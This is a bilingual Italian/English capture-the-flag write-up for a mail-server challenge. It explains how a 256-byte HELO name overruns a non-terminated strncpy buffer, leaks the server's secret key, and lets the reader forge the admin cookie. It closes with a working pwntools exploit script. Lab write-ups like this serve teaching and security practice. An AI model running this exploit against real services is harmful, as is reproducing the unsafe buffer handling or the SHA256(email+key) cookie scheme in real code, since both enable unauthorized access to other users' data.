# M0nk3y_Mail

## The program

A fake mail server ("MailForge Secure™") with a tiny text protocol:

</div>

```
HELO <name>                    <- *** BOF: leaks server_secret_key ***
REGISTER <email> <password>    <- register a new user account
AUTH <email> <password>        <- authenticate with valid credentials
LIST                           <- list your own mail IDs
GET <id> <cookie>              <- read any mail if cookie is valid
COOKIE                         <- show your cookie (key NOT revealed)
QUIT
```

<div class="lang-it" markdown="1">
All'avvio il server genera una `server_secret_key` (32 byte random, esadecimale, 64 char) e registra un utente `admin@challenge.com` a cui invia una mail contenente la flag in chiaro. Il cookie con cui si autorizza la lettura di una mail è:

> `cookie = SHA256( email + server_secret_key )`

Se conoscessimo la `server_secret_key` potremmo forgiare il cookie di *qualunque* utente, admin incluso.

## La vulnerabilità

Il comando `HELO <name>` gestisce il nome con uno `strncpy` in un buffer da 256 byte, seguito da uno `snprintf("... %s ...", name_buf)` per costruire la risposta. Il problema classico: `strncpy` **non aggiunge il NULL terminator** se la sorgente è lunga esattamente quanto la destinazione. Mandando esattamente **256 byte** come nome, `name_buf[256]` resta senza NULL, e la `%s` dello `snprintf` continua a leggere oltre il buffer, direttamente nella `server_secret_key` (che sta subito dopo in memoria), stampandocela nella risposta.

</div>

<div class="lang-en" markdown="1">
On startup the server generates a `server_secret_key` (32 random bytes, hex-encoded, 64 chars) and registers an `admin@challenge.com` user, sending it a mail containing the flag in plaintext. The cookie authorizing a mail read is:

> `cookie = SHA256( email + server_secret_key )`

If we knew the `server_secret_key` we could forge the cookie of *any* user, admin included.

## The vulnerability

The `HELO <name>` command copies the name with `strncpy` into a 256-byte buffer, then builds the reply with `snprintf("... %s ...", name_buf)`. The classic pitfall: `strncpy` **does not add a NULL terminator** when the source is exactly as long as the destination. By sending exactly **256 bytes** as the name, `name_buf[256]` stays un-terminated, and the `snprintf`'s `%s` keeps reading past the buffer straight into `server_secret_key` (laid out right after it), printing it back in the reply.

</div>

<div class="lang-it" markdown="1">
> Nota: il binario è compilato con `-fstack-protector-all`, NX e PIE, quindi l'overflow **non** è sfruttabile per RCE (il canary killa il processo prima del ritorno). La strada intesa è proprio il leak + cookie forgery.

## L'exploit

1. `HELO` con 256 byte → nella risposta troviamo i 64 char della secret key subito dopo le nostre 256 "A".
2. Registriamo e autentichiamo un utente qualsiasi.
3. Forgiamo `SHA256("admin@challenge.com" + key)`.
4. `GET 1 <admin_cookie>` → flag.

</div>

<div class="lang-en" markdown="1">
> Note: the binary is compiled with `-fstack-protector-all`, NX and PIE, so the overflow is **not** exploitable for RCE (the canary kills the process before return). The intended path is exactly the leak + cookie forgery.

## The exploit

1. `HELO` with 256 bytes → the reply contains the 64-char secret key right after our 256 "A"s.
2. Register and authenticate any user.
3. Forge `SHA256("admin@challenge.com" + key)`.
4. `GET 1 <admin_cookie>` → flag.

</div>

```python
from pwn import *
import hashlib

r = remote(HOST, PORT)
r.recvline()

# HELO con nome da 256 byte => over-read che leaka la secret key
r.sendline(b"HELO " + b"A" * 256)
resp = r.recvline()
KEY_START = len("250 Hello ") + 256
key = resp[KEY_START:KEY_START + 64].decode()
log.success(f"Leaked server_secret_key: {key}")

r.sendline(b"REGISTER test@test.com password")
r.sendline(b"AUTH test@test.com password")

# cookie = SHA256(email + key)
admin_cookie = hashlib.sha256(("admin@challenge.com" + key).encode()).hexdigest()
log.success(f"Forged admin cookie: {admin_cookie}")

r.sendline(f"GET 1 {admin_cookie}".encode())
print(r.recvuntil(b".\r\n").decode())
```
